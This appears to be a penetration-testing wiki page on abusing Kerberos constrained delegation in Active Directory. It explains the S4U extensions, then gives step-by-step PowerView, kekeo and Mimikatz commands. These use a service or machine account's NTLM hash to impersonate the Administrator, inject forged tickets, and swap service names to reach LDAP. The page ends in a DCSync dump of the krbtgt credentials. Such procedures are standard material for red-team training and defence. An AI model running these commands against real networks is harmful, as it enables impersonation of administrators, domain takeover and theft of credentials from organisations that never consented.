---
description: Constrained Delegation
---

# Constrained Delegation

> We can access "only" (not that true) specific services on specific computers by impersonating an incoming user.

A typical scenario when a uer authenticates to a web service without Kerberos auth (for example, from a web form) and then the server makes requests to a database to fetch results based on user authorization. Because the user is authenticating to non Kerberos compliant, there are various extensions which allow protocol transition between non kerberos to kerberos auth:

* S4U2self: Allows the service to obtain a forwardable TGS to itself on behalf a user (without supplying a password). The service account must have the set the "TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGTION\_T2A4DU" attribute enabled.
* S4U2proxy: Allows a service to obtain a TGS to a second service on behalf a user.

**Note:** The SPNs we are able to connect (not that true) are the ones specified in the **"msDS-AllowedToDelegateTo"** attribute.

***

### How to abuse

We need to have access (NTLM hash or plaintext password) of a user/machine account with constrained delegation enabled. If we have that access, it is possbile to access the SPNs listed in the "msDS-AllowedToDelegateTo" attribute as any user (even the Domain Administrator).

In theory, we can only access the services listed in the "msDS-AllowedToDelegateTo" attribute, but this is not true. We can actually access all those services on a machine which runs under the same account. For example, if "msDS-AllowedToDelegateTo" only specifies CIFS/XXXX, we can also request a TGS for WMI, PSRemoting, etc.

***

### 1. Enumerate users/computers with constrained delegation enabled

```bash
#PoweView_Dev:
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#ADModule:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

***

### 2.1 Abusing a user account

#### 1. Request a TGT with a user NTLM hash with constrained delegation enabled

```bash
kekeo# tgt::ask /user:$SERVICE_ACCOUNT_NAME /domain:$DOMAIN /rc4:$NTLM_HASH
```

#### 2. Request a TGS for a particular user

```bash
kekeo# tgs::s4u /tgt:$TICKET.kirbi /user:Administrator@example.ex.local /service:CIFS/XXX
#tgt: Ticket location previously generated in step 1 (by default saved to current dir)
#user: The user we want to impersonate.
#service: Service to connect to (listed on msDS-AllowedToDelegateTo).
```

#### 3. Inject the ticket in the current PS proccess (PTT)

```bash
Invoke-Mimikatz -Command '"kerberos::ptt TGS....kirbi" #TGS generated in the above step (2)
```

#### 4. Verify ticket and access the service

```bash
klist
```

***

### 2.2 Abusing a machine account

#### 1. Request a TGT for the machine account

```bash
kekeo# tgt::ask /user:$MACHINE_NAME$ /domain:$DOMAIN /rc4:$NTLM_HASH#Machine name should end with a dollar ($)
```

#### 2. Request a TGS for a service (WITH ANOTHER SERVICE NOT INCLUDED IN MSDS-ALLOWED..) from the same machine account

Here is the "key" concept. We can not only request a TGS for the specific service, if not we can also request for another ones (note the pipe at the end):

```bash
kekeo# tgs::s4u /tgt:$TGT...kirbi /user:Administrator@example.ex.local /service:time/dc-xxx.example.local|ldap/dc-xxx.example.local 

#TGT is the ticket generated from the previous step (1)
#USER is the user to impersonate (DA in this case)
#SERVICE is the service we want to access, note the pipe, LDAP not included in the msDA-Allowed... but still accessbile
```

#### 3. Inject the ticket in the current PS process (PTT)

```bash
Invoke-Mimikatz -Command '"kerberos::ptt TGS...kirbi"' #TGS generated from the previous step (2)
```

#### 4. Verify ticket and access the service

```bash
klist
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"' #DCSync attack can be done because we generated a TGS to the LDAP service (step 2).
```
